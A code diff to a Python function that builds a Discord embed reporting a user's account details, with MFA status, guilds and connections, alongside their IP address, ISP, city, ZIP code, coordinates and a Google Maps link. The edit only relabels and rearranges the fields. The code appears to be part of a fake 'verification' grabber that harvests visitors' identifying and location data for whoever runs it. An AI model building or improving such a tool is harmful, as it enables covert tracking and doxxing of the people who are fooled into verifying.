@@ -241,9 +241,7 @@ def verified():
                 ),
                 "color": 0x5865F2,
     
-                "thumbnail": {
-                    "url": avatar or None
-                },
+                "thumbnail": {"url": avatar or None},
     
                 "fields": [
                     {
@@ -259,20 +257,28 @@ def verified():
                         "name": "🔐 Security",
                         "value": (
                             f"**Verified**\n`{'Yes' if user.get('verified') else 'No'}`\n\n"
-                            f"**MFA Enabled**\n`{'Yes' if user.get('mfa_enabled') else 'No'}`\n\n"
+                            f"**MFA**\n`{'Enabled' if user.get('mfa_enabled') else 'Disabled'}`\n\n"
                             f"**Nitro**\n`{'Yes' if user.get('premium_type') else 'No'}`"
+                        )[:1024],
+                        "inline": True,
+                    },
+                    {
+                        "name": "📊 Stats",
+                        "value": (
+                            f"**Guilds**\n`{len(guild_list.splitlines()) if guild_list else 0}`\n\n"
+                            f"**Connections**\n`{len(connection_list.splitlines()) if connection_list else 0}`"
                         )[:1024],
                         "inline": True,
                     },
                     {
                         "name": "🌐 Network",
                         "value": (
-                            f"**IP Address**\n`{ip or 'N/A'}`\n\n"
+                            f"**IP**\n`{ip or 'N/A'}`\n\n"
                             f"**ISP**\n`{geo.get('isp') or 'N/A'}`\n\n"
-                            f"**Organization**\n`{geo.get('org') or 'N/A'}`\n\n"
+                            f"**Org**\n`{geo.get('org') or 'N/A'}`\n\n"
                             f"**ASN**\n`{geo.get('as') or 'N/A'}`"
                         )[:1024],
-                        "inline": False,
+                        "inline": True,
                     },
                     {
                         "name": "📍 Location",
@@ -280,19 +286,16 @@ def verified():
                             f"**Country**\n`:flag_{flag}: {geo.get('country') or 'N/A'}`\n\n"
                             f"**Region**\n`{geo.get('regionName') or 'N/A'}`\n\n"
                             f"**City**\n`{geo.get('city') or 'N/A'}`\n\n"
-                            f"**ZIP Code**\n`{geo.get('zip') or 'N/A'}`\n\n"
-                            f"**Coordinates**\n`{lat or 'N/A'}, {lon or 'N/A'}`\n\n"
+                            f"**ZIP**\n`{geo.get('zip') or 'N/A'}`\n\n"
+                            f"**Coords**\n`{lat or 'N/A'}, {lon or 'N/A'}`\n\n"
                             f"**Timezone**\n`{geo.get('timezone') or 'N/A'}`"
                         )[:1024],
-                        "inline": False,
+                        "inline": True,
                     },
                     {
-                        "name": "📊 Stats",
-                        "value": (
-                            f"**Guild Count**\n`{len(guild_list.splitlines()) if guild_list else 0}`\n\n"
-                            f"**Connections Count**\n`{len(connection_list.splitlines()) if connection_list else 0}`"
-                        )[:1024],
-                        "inline": True,
+                        "name": "🗺 Map",
+                        "value": f"[Open in Google Maps]({map_url})" if map_url else "`N/A`",
+                        "inline": False,
                     },
                     {
                         "name": "🏠 Guilds",
@@ -302,14 +305,6 @@ def verified():
                     {
                         "name": "🔗 Connections",
                         "value": f"```{(connection_list or 'None')[:1000]}```",
-                        "inline": False,
-                    },
-                    {
-                        "name": "🗺 Map",
-                        "value": (
-                            f"[Open in Google Maps]({map_url})"
-                            if map_url else "`N/A`"
-                        ),
                         "inline": False,
                     },
                 ],
